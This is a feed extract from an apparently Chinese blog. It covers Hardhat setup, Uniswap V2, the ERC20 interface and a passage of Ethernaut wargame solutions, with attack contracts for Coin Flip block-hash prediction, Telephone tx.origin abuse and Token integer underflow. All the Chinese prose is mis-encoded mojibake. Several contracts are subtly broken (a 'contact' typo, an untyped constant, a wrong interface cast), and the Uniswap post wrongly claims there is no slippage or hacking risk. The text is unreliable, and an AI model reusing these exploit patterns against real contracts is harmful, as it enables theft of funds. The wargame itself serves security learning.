        <content type="html"><![CDATA[<h1 id="hardhat"><a href="#hardhat" class="headerlink" title="hardhat"></a>hardhat</h1><p><strong>hardhat</strong>å°±æ˜¯ä»¥å¤ªåŠå¼€å‘ç¯å¢ƒï¼Œå¦‚åŒremix,ç°åœ¨ä»‹ç»ä¸€ä¸‹å®‰è£…<strong>hardhat</strong>çš„æ­¥éª¤</p><ul><li>æ‰“å¼€ç»ˆç«¯ï¼Œwin+r,è¾“å…¥cmd</li><li>æ£€æŸ¥node js,å®‰è£…æ²¡æœ‰ï¼Œ<code>node -v</code> (æ²¡æœ‰å®‰è£…å»å®˜ç½‘ä¸‹è½½)</li><li>å»ºä¸€ä¸ªæ–‡ä»¶å¤¹ï¼Œåœ¨ç»ˆç«¯è¾“å…¥<code>mkdir hardhat-tutorial</code>ï¼Œç„¶åè¿›å…¥æ–‡ä»¶å¤¹ï¼Œ<code>cd hardhat-tutorial</code></li><li>è¿›è¡Œåˆå§‹åŒ–ï¼Œ<code>npm init</code>ï¼Œæ¥ä¸‹æ¥ä¸€ç›´æŒ‰enter,ç›´åˆ°å‡ºç°<code>Is this OK? (yes)</code>,å›ç­”yeså³å¯</li><li>å®‰è£…<strong>hardhat</strong> <code>npm install --save-dev hardhat</code>,éœ€è¦ç­‰å¾…å‡ ç§’</li><li>å†å®‰è£…ä¸€ä¸ªæ’ä»¶ npm install â€“save-dev @nomicfoundation&#x2F;hardh<br>at-toolbox<br>s</li></ul><h2 id="ç¼–å†™åˆåŒ"><a href="#ç¼–å†™åˆåŒ" class="headerlink" title="ç¼–å†™åˆåŒ"></a>ç¼–å†™åˆåŒ</h2><p>å®‰è£…å®Œæˆåï¼Œå› ä¸ºä½¿ç”¨VScode,æ‰€ä»¥æˆ‘ä»¬è¦å®‰è£…ä¸€ä¸ªVScode å®‰å…¨å¸½ï¼Œå®ƒå¯ä»¥å¸®ç»„æˆ‘ä»¬æ›´å¥½çš„ä½¿ç”¨solidityè¯­è¨€ï¼Œç„¶ååœ¨VScodeåˆ›å»ºä¸€ä¸ªæ–°ç›®å½•ï¼Œå†™ä¸€ä¸ªç®€å•çš„.solåˆçº¦ï¼Œåœ¨ç»ˆç«¯ä¸­è¿è¡Œè¯¥åˆçº¦ï¼Œ<code>npx hardhat compile,</code>æˆåŠŸåå°±ä¼šçœ‹åˆ°<code>Compiled 1 Solidity file successfully (evm target: paris).</code></p><h2 id="æµ‹è¯•åˆçº¦"><a href="#æµ‹è¯•åˆçº¦" class="headerlink" title="æµ‹è¯•åˆçº¦"></a>æµ‹è¯•åˆçº¦</h2><p><code>npx hardhat test</code>,å¦‚æœä½ æƒ³çœ‹åˆ°solidityçš„æ—¥å¿—æ¶ˆæ¯ï¼Œåˆçº¦å˜é‡ï¼Œå¿…é¡»å¯¼å…¥<code>hardhat/console.sol</code>åˆçº¦ä»£ç </p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">import &quot;hardhat/console.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract Token &#123;</span><br><span class="line">  //...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å†æ·»åŠ ä¸€äº›å¯¹è¯¥å‡½æ•°console.logçš„è°ƒç”¨transfer()</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function transfer(address to, uint256 amount) external &#123;</span><br><span class="line">    require(balances[msg.sender] &gt;= amount, &quot;Not enough tokens&quot;);</span><br><span class="line"></span><br><span class="line">    console.log(</span><br><span class="line">        &quot;Transferring from %s to %s %s tokens&quot;,</span><br><span class="line">        msg.sender,</span><br><span class="line">        to,</span><br><span class="line">        amount</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    balances[msg.sender] -= amount;</span><br><span class="line">    balances[to] += amount;</span><br><span class="line"></span><br><span class="line">    emit Transfer(msg.sender, to, amount);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ€»ç»“ï¼Œhardhatå°±æ˜¯èƒ½è½»æ¾éƒ¨ç½²æˆ‘ä»¬çš„åˆçº¦ã€è¿è¡Œæµ‹è¯•å’Œè°ƒè¯• Solidity ä»£ç ï¼Œæ— éœ€å¤„ç†å®æ—¶ç¯å¢ƒï¼Œæ›´å¤šçŸ¥è¯†è¯·å‚è€ƒ<a href="https://hardhat.org/">hardhat</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Uniswap V2</title>
      <link href="/2024/08/06/uniswap-V2/"/>
      <url>/2024/08/06/uniswap-V2/</url>
      
        <content type="html"><![CDATA[<h1 id="Uniswap-V2"><a href="#Uniswap-V2" class="headerlink" title="Uniswap V2"></a>Uniswap V2</h1><p><strong>Uniswap</strong>æ˜¯ä¸€ç§æµè¡Œçš„å»ä¸­å¿ƒåŒ–äº¤æ˜“æ‰€ (DEX)åè®®ï¼Œå…è®¸ç”¨æˆ·å°†ä»»ä½• ERC20 ä»£å¸äº¤æ¢ä¸ºå¦ä¸€ç§ä»£å¸ï¼Œæä¾›æµåŠ¨æ€§ä»¥èµšå–è´¹ç”¨ï¼Œå¹¶è®¿é—®ä»¥å¤ªåŠåŒºå—é“¾ä¸Šçš„ä»·æ ¼é¢„è¨€æœºã€‚ è€ŒUniswap V2å…·æœ‰æ›´å¼ºå¤§çš„åŠŸèƒ½ï¼Œå¦‚ä¸‹ï¼š</p><ul><li>å®ƒå…è®¸ä»»ä½•çš„ERC20ä»£å¸ä¸å…¶ä»–çš„ERC20ä»£å¸é…å¯¹ï¼Œæ— éœ€ETHä½œä¸ºä¸­ä»‹ï¼Œè¿™ä½¿å¾—æµåŠ¨æ€§æ± æ›´åŠ å¤šæ ·åŒ–å’Œé«˜æ•ˆï¼Œå¹¶ä¸ºäº¤æ˜“è€…æä¾›æ›´å¥½çš„ä»·æ ¼ã€‚ å°±æ˜¯ä¸€ç§ä»£å¸å¯ä¸å…¶ä»–çš„ä»£å¸è½¬åŒ–ï¼Œæ–¹ä¾¿å¾ˆå¤š</li><li>Uniswap V2 å®æ–½äº†ä¸€ç§æ–°é¢–çš„æœºåˆ¶ï¼Œå¯å®ç°é«˜åº¦å»ä¸­å¿ƒåŒ–ä¸”æŠ—æ“çºµçš„é“¾ä¸Šä»·æ ¼ä¾›ç»™ã€‚ è¿™æ˜¯é€šè¿‡åœ¨æ¯ä¸ªåŒºå—å¼€å§‹æ—¶æµ‹é‡ä¸¤ç§èµ„äº§çš„ç›¸å¯¹ä»·æ ¼å¹¶éšç€æ—¶é—´çš„æ¨ç§»ç§¯ç´¯å†å²æ•°æ®æ¥å®ç°çš„ã€‚ è¿™å…è®¸å¤–éƒ¨æ™ºèƒ½åˆçº¦æŸ¥è¯¢ä»»ä½•æ—¶é—´é—´éš”å†…ä»»ä½•è´§å¸å¯¹çš„æ—¶é—´åŠ æƒå¹³å‡ä»·æ ¼ï¼ˆTWAPï¼‰ï¼ŒåŒæ—¶å°†å¤©ç„¶æ°”æˆæœ¬å’Œé¢„è¨€æœºé£é™©é™è‡³æœ€ä½ã€‚</li><li>Uniswap V2 æ”¯æŒä¸€ç§ç§°ä¸ºé—ªç”µäº’æ¢çš„æ–°å‹äº¤æ˜“ï¼Œç”¨æˆ·å¯ä»¥ä»æ± ä¸­æ¥æ”¶ä»»æ„æ•°é‡çš„ä»»ä½•èµ„äº§ï¼Œå¹¶åœ¨é“¾ä¸Šçš„å…¶ä»–åœ°æ–¹ä½¿ç”¨å®ƒï¼Œåªè¦ä»–ä»¬åœ¨äº¤æ˜“ç»“æŸæ—¶å¿è¿˜è¯¥é‡‘é¢å¹¶æ”¯ä»˜è´¹ç”¨å³å¯ã€‚ äº¤æ˜“ã€‚ è¿™ä¸ºå¥—åˆ©ã€ä¿è¯é‡‘äº¤æ˜“ã€æŠµæŠ¼å“äº’æ¢ç­‰å¼€è¾Ÿäº†æ–°çš„å¯èƒ½æ€§ã€‚</li></ul><p>åŒæ—¶å®ƒä¹Ÿæœ‰å¾ˆå¤šå¥½å¤„ï¼š</p><ul><li>ä½è´¹ç”¨ï¼šUniswap V2 å¯¹æ¯ç¬”äº¤æ˜“æ”¶å– 0.3% çš„å›ºå®šè´¹ç”¨ï¼Œè¯¥è´¹ç”¨ç”±æ‰€æœ‰æµåŠ¨æ€§æä¾›è€…æŒ‰å…¶åœ¨æ± ä¸­çš„æƒç›Šæ¯”ä¾‹åˆ†é…ã€‚ è¯¥è´¹ç”¨ä½äºå¤§å¤šæ•°ä¸­å¿ƒåŒ–äº¤æ˜“æ‰€å’Œå…¶ä»– DEX åè®®ï¼Œè¿™ä½¿å¾— Uniswap V2 æˆä¸ºä¸­å°é¢äº¤æ˜“çš„æœ‰å¸å¼•åŠ›çš„é€‰æ‹©ã€‚</li><li>é«˜æµåŠ¨æ€§ï¼šUniswap V2 åˆ©ç”¨ä»¥å¤ªåŠåŠå…¶åºå¤§çš„ ERC20 ä»£å¸ç”Ÿæ€ç³»ç»Ÿçš„ç½‘ç»œæ•ˆåº”ï¼Œä¸ºä»»ä½•ä»£å¸å¯¹æä¾›é«˜æµåŠ¨æ€§ã€‚ ä»»ä½•äººéƒ½å¯ä»¥é€šè¿‡æä¾›ä¸€å®šæ•°é‡çš„ä¸¤ç§ä»£å¸æ¥åˆ›å»ºæ–°çš„è´§å¸å¯¹æˆ–åŠ å…¥ç°æœ‰çš„è´§å¸å¯¹ï¼Œä»è€Œå¢åŠ æ± çš„æ·±åº¦å’Œå¯ç”¨æ€§ã€‚ æ­¤å¤–ï¼ŒUniswap V2 é‡‡ç”¨è‡ªåŠ¨åšå¸‚å•†ï¼ˆAMMï¼‰æ¨¡å‹ï¼Œæ ¹æ®ä¾›éœ€æƒ…å†µè°ƒæ•´ä»·æ ¼ï¼Œç¡®ä¿ä»»ä½•äº¤æ˜“è§„æ¨¡å§‹ç»ˆæœ‰è¶³å¤Ÿçš„æµåŠ¨æ€§ã€‚</li><li>æ— è®¸å¯è®¿é—®ï¼šUniswap V2 æ˜¯<strong>å®Œå…¨å»ä¸­å¿ƒåŒ–å’Œéæ‰˜ç®¡çš„</strong>ï¼Œè¿™æ„å‘³ç€ä»»ä½•äººéƒ½å¯ä»¥ä½¿ç”¨å®ƒï¼Œè€Œæ— éœ€æ³¨å†Œå¸æˆ·ã€éªŒè¯èº«ä»½æˆ–ä¿¡ä»»ç¬¬ä¸‰æ–¹ä½¿ç”¨å…¶èµ„é‡‘ã€‚ ç”¨æˆ·å¯ä»¥å®Œå…¨æ§åˆ¶è‡ªå·±çš„èµ„äº§ï¼Œå¯ä»¥éšæ—¶è¿›è¡Œäº¤æ˜“æˆ–æä¾›æµåŠ¨æ€§ï¼Œè€Œæ— éœ€æ‹…å¿ƒåœæœºã€å®¡æŸ¥æˆ–é»‘å®¢æ”»å‡»ã€‚</li><li>é€æ˜å®šä»·ï¼šUniswap V2 é‡‡ç”¨ç®€å•é€æ˜çš„å®šä»·æœºåˆ¶ï¼Œç”±æ’å®šä¹˜ç§¯å…¬å¼å’ŒçŸ¿æ± å½“å‰å‡†å¤‡é‡‘ä½™é¢å†³å®šã€‚ ç”¨æˆ·å¯ä»¥è½»æ¾è®¡ç®—ä»–ä»¬å°†æ”¶åˆ°æˆ–æ”¯ä»˜ä»»ä½•äº¤æ˜“çš„ç¡®åˆ‡ä»£å¸æ•°é‡ï¼Œæ²¡æœ‰ä»»ä½•éšè—è´¹ç”¨æˆ–æ»‘ç‚¹ã€‚ ç”¨æˆ·è¿˜å¯ä»¥æ ¹æ®æ± çš„å†å²æ•°æ®è®¿é—®ä»»ä½•è´§å¸å¯¹çš„å¯é ä¸”æ— éœ€ä¿¡ä»»çš„ä»·æ ¼é¢„è¨€æœºã€‚</li></ul><p>è¦ä½¿ç”¨Uniswap V2å¯åœ¨<a href="https://uniswap.org/">å®˜ç½‘</a>ä¸Šè®¿é—®,å¯ä»¥è‡ªå·±åˆ›å»ºä¸€ä¸ªUniswapé’±åŒ…ï¼Œä¸€å®šè¦è®°ä½<strong>ç§é’¥</strong></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>ERC20</title>
      <link href="/2024/08/05/ERC20/"/>
      <url>/2024/08/05/ERC20/</url>
      
        <content type="html"><![CDATA[<h1 id="ERC20"><a href="#ERC20" class="headerlink" title="ERC20"></a>ERC20</h1><p><code>ERC20</code>æ˜¯ä»¥å¤ªåŠä¸Šçš„ä»£å¸æ ‡å‡†ï¼Œå®ƒå®ç°äº†ä»£å¸è½¬è´¦çš„åŸºæœ¬é€»è¾‘ï¼š</p><ul><li>è´¦æˆ·ä½™é¢(balanceOf())</li><li>è½¬è´¦(transfer())</li><li>æˆæƒè½¬è´¦(transferFrom())</li><li>æˆæƒ(approve())</li><li>ä»£å¸æ€»ä¾›ç»™(totalSupply())</li><li>æˆæƒè½¬è´¦é¢åº¦(allowance())</li><li>ä»£å¸ä¿¡æ¯ï¼ˆå¯é€‰ï¼‰ï¼šåç§°(name())ï¼Œä»£å·(symbol())ï¼Œå°æ•°ä½æ•°(decimals())</li></ul><p>é™¤äº†ERC20,è¿˜æœ‰å®ƒçš„æ¥å£åˆçº¦IERC20ï¼Œå°±æ˜¯ä¸ºäº†ç»Ÿä¸€è§„èŒƒï¼Œä»¥ä¾¿å¥½ä½¿ç”¨ï¼Œæ¥ä¸‹æ¥å°±ä»‹ç»ä¸€ä¸‹IERC20åˆçº¦çš„åŠŸèƒ½</p><h2 id="ä¿©ä¸ªäº‹ä»¶"><a href="#ä¿©ä¸ªäº‹ä»¶" class="headerlink" title="ä¿©ä¸ªäº‹ä»¶"></a>ä¿©ä¸ªäº‹ä»¶</h2><ul><li>é‡Šæ”¾æ¡ä»¶ï¼šå½“ <code>value</code> å•ä½çš„è´§å¸ä»è´¦æˆ· (<code>from</code>) è½¬è´¦åˆ°å¦ä¸€è´¦æˆ· (<code>to</code>)æ—¶.<br><code>event Transfer(address indexed from, address indexed to, uint256 value);</code></li><li>é‡Šæ”¾æ¡ä»¶ï¼šå½“ <code>value</code> å•ä½çš„è´§å¸ä»è´¦æˆ· (<code>owner</code>) æˆæƒç»™å¦ä¸€è´¦æˆ· (<code>spender</code>ï¼‰æ—¶.<br><code>event Approval(address indexed owner, address indexed spender, uint256 value);</code></li></ul><h2 id="å…­ä¸ªå‡½æ•°"><a href="#å…­ä¸ªå‡½æ•°" class="headerlink" title="å…­ä¸ªå‡½æ•°"></a>å…­ä¸ªå‡½æ•°</h2><ul><li><code>totalSupply()</code>è¿”å›ä»£å¸æ€»ä¾›ç»™<br><code>function totalSupply() external view returns (uint256);</code></li><li><code>balanceOf()</code>è¿”å›è´¦æˆ·<code>account</code>æ‰€æŒæœ‰çš„ä»£å¸æ•°.<br><code>function balanceOf(address account) external view returns (uint256);</code></li><li><code>transfer()</code>è½¬è´¦ <code>amount</code> å•ä½ä»£å¸ï¼Œä»è°ƒç”¨è€…è´¦æˆ·åˆ°å¦ä¸€è´¦æˆ· <code>to</code>,å¦‚æœæˆåŠŸï¼Œè¿”å› <code>true</code>,é‡Šæ”¾ {Transfer} äº‹ä»¶.<br><code>function transfer(address to, uint256 amount) external returns (bool);</code></li><li><code>allowance()</code>è¿”å›<code>owner</code>è´¦æˆ·æˆæƒç»™<code>spender</code>è´¦æˆ·çš„é¢åº¦ï¼Œé»˜è®¤ä¸º0,å½“{approve} æˆ– {transferFrom} è¢«è°ƒç”¨æ—¶ï¼Œ<code>allowance</code>ä¼šæ”¹å˜<br><code>function allowance(address owner, address spender) external view returns (uint256);</code></li><li><code>approve()</code>è°ƒç”¨è€…è´¦æˆ·ç»™<code>spender</code>è´¦æˆ·æˆæƒ <code>amount</code>æ•°é‡ä»£å¸,å¦‚æœæˆåŠŸï¼Œè¿”å› <code>true</code>,é‡Šæ”¾ {Approval} äº‹ä»¶<br><code>function approve(address spender, uint256 amount) external returns (bool);</code></li><li><code>transferFrom()</code>é€šè¿‡æˆæƒæœºåˆ¶ï¼Œä»<code>from</code>è´¦æˆ·å‘<code>to</code>è´¦æˆ·è½¬è´¦<code>amount</code>æ•°é‡ä»£å¸ã€‚è½¬è´¦çš„éƒ¨åˆ†ä¼šä»è°ƒç”¨è€…çš„<code>allowance</code>ä¸­æ‰£é™¤ã€‚ å¦‚æœæˆåŠŸï¼Œè¿”å› <code>true</code>. é‡Šæ”¾ {Transfer} äº‹ä»¶. <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"> function transferFrom(</span><br><span class="line">    address from,</span><br><span class="line">    address to,</span><br><span class="line">    uint256 amount</span><br><span class="line">) external returns (bool);</span><br></pre></td></tr></table></figure>ä»¥ä¸Šé¡»è®°ä½ï¼Œä»¥ä¾¿å¥½ç”¨</li></ul><p>è¯´ç™½äº†ï¼Œå®ƒå°±æ˜¯ä»¥å¤ªåŠå‘è¡Œä»£å¸çš„ä¸€ä¸ªæ ‡å‡†ï¼Œå­¦ä¼šäº†å¦‚ä½•å®ç°ERC20ï¼Œå¯¹å…¥é—¨åŒºå—é“¾æ˜¯å¾ˆæœ‰å¸®åŠ©çš„</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Ethernauté¶åœºé¢˜è§£</title>
      <link href="/2024/08/01/Ethernaut%E9%9D%B6%E5%9C%BA%E9%A2%98%E8%A7%A3/"/>
      <url>/2024/08/01/Ethernaut%E9%9D%B6%E5%9C%BA%E9%A2%98%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<h1 id="Ethernaut"><a href="#Ethernaut" class="headerlink" title="Ethernaut"></a><a href="https://ethernaut.openzeppelin.com/">Ethernaut</a></h1><h2 id="Fallback"><a href="#Fallback" class="headerlink" title="Fallback"></a>Fallback</h2><p>è¦æ±‚æ˜¯ï¼Œæˆä¸ºè¿™ä¸ªåˆçº¦çš„æ‰€æœ‰è€…ï¼Œå¹¶ä½¿è¿™ä¸ªåˆçº¦çš„é’±ä¸ºé›¶</p><p>åˆ†æ;<br>ä»è¿™ä¸ªåˆçº¦ä¸­å¯ä»¥çœ‹åˆ°ï¼Œè¦æˆä¸ºowner<br>1ï¼Œæˆ‘ä»¬çš„é’±å¿…é¡»å¤§äºåˆçº¦æŒæœ‰è€…çš„é’±ï¼Œä½†æ˜¯æœ€å¼€å§‹åˆçº¦æœ¬èº«å°±æœ‰1000etherï¼Œè¿™ä¸ªæ—¶å€™å°±èµ°contributeå‡½æ•°ä¸è¡Œï¼Œå› ä¸ºæˆ‘ä»¬æ²¡æœ‰é‚£ä¹ˆå¤šé’±<br>2ï¼Œæ­¤æ—¶å‘ç°receiveï¼Œåªè¦æˆ‘ä»¬çš„é’±å’Œåˆçº¦çš„é’±å¤§äº0ï¼Œå°±å¯ä»¥æˆä¸ºè¿™ä¸ªåˆçº¦çš„æŒæœ‰è€…</p><p>æ–¹æ³•ï¼š<br>1ï¼Œåœ¨remixä¸Šä¸èƒ½éƒ¨ç½²è¿™ä¸ªåˆçº¦ï¼Œå› ä¸ºéƒ¨ç½²åï¼Œåˆçº¦åˆå§‹åŒ–ï¼Œownerå°±æ˜¯æˆ‘ä»¬è‡ªå·±äº†</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">constructor() &#123;</span><br><span class="line">      owner = msg.sender;</span><br><span class="line">      contributions[msg.sender] = 1000 * (1 ether);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>ç›´æ¥ä½¿ç”¨åˆçº¦åœ°å€<strong>At Adress</strong><br>2,è°ƒç”¨contributeå‡½æ•°ï¼Œè½¬è´¦1weiï¼›<br>2,è°ƒç”¨receiveå‡½æ•°ï¼Œè½¬è´¦1wei,å°±å®Œæˆäº†,æ³¨æ„è®°å¾—å°†é’±æ”¶å›æ¥</p><hr><h2 id="Fal1out"><a href="#Fal1out" class="headerlink" title="Fal1out"></a>Fal1out</h2><p>è¦æ±‚æ˜¯ï¼Œæˆä¸ºè¿™ä¸ªåˆçº¦çš„æ‰€æœ‰è€…</p><p>åˆ†æï¼š<br>æ³¨æ„è¿™ä¸ªçš„solidityçš„ç‰ˆæœ¬æ˜¯0.6ï¼Œæ²¡æœ‰å½±å“å…³ç³»ï¼Œåªæ˜¯æ„é€ å‡½æ•°çš„å†™æ³•ä¸ä¸€æ ·ï¼Œå¦‚ï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//solidity 0.8</span><br><span class="line">  constructor foo()&#123;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line">//solidity 0.6</span><br><span class="line">  function foo()&#123;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>çœ‹ä¸ownerç›¸å…³çš„å‡½æ•°ï¼Œå†å»åˆ†ææ„é€ çš„åˆçº¦åå­—Falloutï¼Œä»”ç»†å‘ç°æœ‰ä¸ªFal1outçš„å‡½æ•°ï¼Œå®ƒå®é™…ä¸Šæ˜¯å‘½åé”™è¯¯çš„ï¼Œè¿™ä¸ªæ—¶å€™æˆ‘ä»¬å°±å¯ä»¥è°ƒåŠ¨è¿™ä¸ªå‡½æ•°ï¼Œåˆšå¥½æˆä¸ºåˆçº¦çš„æ‰€æœ‰è€…</p><p>æ–¹æ³•ï¼šç›´æ¥éƒ¨ç½²ä¸è¡Œï¼Œå› ä¸ºé‡Œé¢æœ‰å…¶ä»–çš„importï¼Œæ‰€ä»¥æˆ‘ä»¬å°±å¤–éƒ¨è°ƒç”¨è¿™ä¸ªåˆçº¦ï¼Œä½¿ç”¨æ¥å£,å¦åˆ›å»ºä¸€ä¸ªåˆçº¦</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">interface Fallout &#123;</span><br><span class="line">    function owner() external view returns(address) //è§‚å¯Ÿæ‰€æœ‰è€…çš„åœ°å€æ˜¯å¦ä¸ºæˆ‘ä»¬</span><br><span class="line">    function Fal1out() external payable;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h2 id="Coin-Flip"><a href="#Coin-Flip" class="headerlink" title="Coin Flip"></a>Coin Flip</h2><p>è¦æ±‚æ˜¯ï¼Œè¿ç»­çŒœå¯¹10æ¬¡çŒœå¯¹ç¡¬å¸çš„ç»“æœ</p><p>åˆ†æï¼šå°±æ˜¯è¦æƒ³åŠæ³•è°ƒç”¨flip()å‡½æ•°10æ¬¡ï¼Œè®©çŒœæµ‹çš„ç»“æœä¸sideä¸€è‡´</p><p>æ–¹æ³•ï¼šç›´æ¥ä¸Šæ”»å‡»åˆçº¦,åœ¨ç›®æ ‡åˆçº¦å†…,éƒ¨ç½²æ”»å‡»åˆçº¦ï¼Œå°±æ˜¯ä¸€æ ·çš„è°ƒç”¨ç›®æ ‡åˆçº¦çš„flipå‡½æ•°ä¹‹åï¼Œå¾—åˆ°çš„guessåœ¨è¿›å…¥ä¸€æ ·çš„ç›®æ ‡åˆçº¦ä¹‹ä¸­ï¼Œè¿™æ ·æˆ‘ä»¬çš„çŒœæµ‹å€¼guesså°±ä¸sideä¸€æ ·äº†</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">contact Hack &#123;</span><br><span class="line">  CoinFlip private immutable target;</span><br><span class="line">  FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;</span><br><span class="line"></span><br><span class="line">  constructor (address _target)&#123;</span><br><span class="line">    target = CoinFlip(_target);</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  function flip external &#123;</span><br><span class="line">    bool guess = _guess();</span><br><span class="line">    require(target.flip(guess),&quot;guess failed&quot;);//ä¿è¯æ”»å‡»åˆçº¦ä¸­çš„guessä¸åˆå§‹åˆçº¦çš„sideä¸€æ ·</span><br><span class="line">    &#125;</span><br><span class="line">  // å¤åˆ¶åˆå§‹åˆçº¦çš„flip()å‡½æ•°</span><br><span class="line">  function _guess() view returns (bool) &#123;</span><br><span class="line">    uint256 blockValue = uint256(blockhash(block.number - 1));</span><br><span class="line">    uint256 coinFlip = blockValue / FACTOR;</span><br><span class="line">    bool side = coinFlip == 1 ? true : false;</span><br><span class="line">     return side;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h2 id="Telephone"><a href="#Telephone" class="headerlink" title="Telephone"></a>Telephone</h2><p>è¦æ±‚æ˜¯ï¼Œè·å¾—è¯¥åˆçº¦çš„æ‰€æœ‰æƒ</p><p>åˆ†æï¼šä»£ç è¿˜æ˜¯æŒºçŸ­çš„ï¼Œä¸»è¦å°±æ˜¯å¼„æ‡‚<strong>tx.origin</strong>æ˜¯ä»€ä¹ˆæ„æ€ï¼Œ<strong>tx.origin</strong>æ˜¯å‘èµ·äº¤æ˜“çš„è´¦æˆ·ï¼Œ<strong>msg.sender</strong>æ˜¯å½“å‰ç›´æ¥è°ƒç”¨è¿™ä¸ªåˆçº¦çš„å³æ—¶è´¦æˆ·ï¼Œåªè¦è¿™ä¿©è€…ä¸ä¸€æ ·å°±æˆåŠŸäº†<br>è¯¦ç»†è§£é‡Šï¼š</p><ul><li>Aè°ƒç”¨Båˆçº¦<ul><li>tx.origin&#x3D;A</li><li>msg.sender&#x3D;A</li></ul></li><li>Aè°ƒç”¨Båˆçº¦ï¼ŒBåˆçº¦è°ƒç”¨Cåˆçº¦<ul><li>tx.origin&#x3D;A</li><li>msg.sender&#x3D;B</li></ul></li></ul><p>æ–¹æ³•ï¼šç›´æ¥è°ƒç”¨Telephoneåˆçº¦ï¼Œä¸èƒ½æ»¡è¶³æ¡ä»¶ï¼Œæ‰€ä»¥æˆ‘ä»¬è¦å†™ä¸€ä¸ªæ”»å‡»åˆçº¦æ¥è°ƒç”¨Telephoneåˆçº¦</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">contract Hack &#123;</span><br><span class="line">  constructor (address _target)&#123;</span><br><span class="line">    Telephone(_target).changeOwner(msg.sender);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>_targetæ¥å—Telephoneçš„åœ°å€ï¼Œæˆ‘ä»¬éƒ¨ç½²Hackåˆçº¦ï¼Œmsg.senderå°±æ˜¯æˆ‘ä»¬çš„åœ°å€</p><hr><h2 id="Token"><a href="#Token" class="headerlink" title="Token"></a>Token</h2><p>è¦æ±‚æ˜¯ï¼Œæˆ‘ä»¬æœ‰20ä¸ªä»£å¸ï¼Œéœ€è¦è®©ä»£å¸ä½™é¢å¢åŠ åˆ°20ä»¥ä¸Š</p><p>åˆ†æï¼šè¿˜æ˜¯çœ‹solidityç‰ˆæœ¬ï¼Œ0.6ç‰ˆæœ¬æ²¡æœ‰å†…ç½®Safemath,æ‰€ä»¥å°±å¯ä»¥æ‰§è¡Œæº¢å‡ºæˆ–è€…ä¸‹æº¢çš„æ“ä½œ  </p><blockquote><p>Safemath:åœ¨Solidity ä¸­ï¼ŒSafeMathæ˜¯ä¸€ä¸ªå¸¸ç”¨çš„åº“ï¼Œç”¨äºé˜²æ­¢æ•´æ•°æº¢å‡ºå’Œä¸‹æº¢çš„å®‰å…¨æ•°å­¦è¿ç®—å·¥å…·ã€‚ç”±äºSolidityçš„æ•´æ•°ç±»å‹ï¼ˆå¦‚ uint å’Œint ï¼‰æ˜¯æœ‰é™çš„ï¼Œå½“è¿›è¡ŒåŠ æ³•ã€å‡æ³•ã€ä¹˜æ³•æˆ–é™¤æ³•è¿ç®—æ—¶ï¼Œå¦‚æœæ“ä½œç»“æœè¶…å‡ºäº†ç±»å‹èŒƒå›´ï¼Œå°±ä¼šå¯¼è‡´æº¢å‡ºæˆ–ä¸‹æº¢<br>å¦‚ï¼Œ0-1ä¼šå¯¼è‡´ä¸‹æº¢ï¼Œå°±ä¼šç”Ÿæˆæœ€å¤§çš„æ— ç¬¦å·æ•´æ•°ï¼Œå¹¶ä¸”å¤§äº0</p></blockquote><p>æ–¹æ³•ï¼šè°ƒç”¨æ”»å‡»åˆçº¦ä¸­ï¼Œå†è°ƒç”¨transferå‡½æ•°ï¼Œç»™msg.senderè½¬è´¦1ä¸ªä»£å¸ï¼Œç”±äºæ”»å‡»åˆçº¦æ²¡æœ‰ä»£å¸ï¼Œå°±ä¼šå‘ç”Ÿä¸‹æº¢</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">interface Token &#123;</span><br><span class="line">function balanceOf(address _) public view returns (uint256)</span><br><span class="line">function transfer(address _to, uint256 _value) public returns (bool)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Hack &#123;</span><br><span class="line">  constructor(address _target)&#123;</span><br><span class="line">   Telephone(_target).transfer(msg.sender,1);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h2 id="Delegation"><a href="#Delegation" class="headerlink" title="Delegation"></a>Delegation</h2><p>è¦æ±‚æ˜¯ï¼Œè·å¾—è¿™ä¸ªåˆçº¦çš„æ‰€æœ‰æƒ</p><p>åˆ†æï¼šç†è§£<a href="https://wtf.academy/docs/solidity-102/Delegatecall/">delegatecall</a>,å°±æ˜¯è°ƒç”¨pwmå‡½æ•°ï¼Œé€šè¿‡è§¦å‘fallbackå‡½æ•°ï¼Œç„¶åè¿›è¡Œå§”æ‰˜ç”¨</p><p>æ–¹æ³•ï¼šéƒ¨ç½²Delegateåˆçº¦ï¼Œä½†æ˜¯ä¸è°ƒç”¨ï¼Œæˆ‘ä»¬æ˜¯åœ¨delegationåˆçº¦ä¸Šè°ƒç”¨pwnå‡½æ•°</p><hr><h2 id="Force"><a href="#Force" class="headerlink" 